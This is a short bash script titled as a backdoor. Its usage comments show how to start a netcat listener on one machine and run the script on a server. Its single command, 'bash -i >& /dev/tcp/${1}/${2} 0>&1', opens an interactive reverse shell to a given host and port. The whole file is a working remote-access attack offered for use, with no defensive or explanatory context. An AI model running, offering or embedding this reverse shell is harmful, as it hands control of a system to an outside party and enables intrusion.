#!/bin/bash

# Usage
# on client
# $ nc -l -k 2000
#
# on server
# $ ./backdoor.sh 192.168.1.100 2000


bash -i >& /dev/tcp/${1}/${2} 0>&1
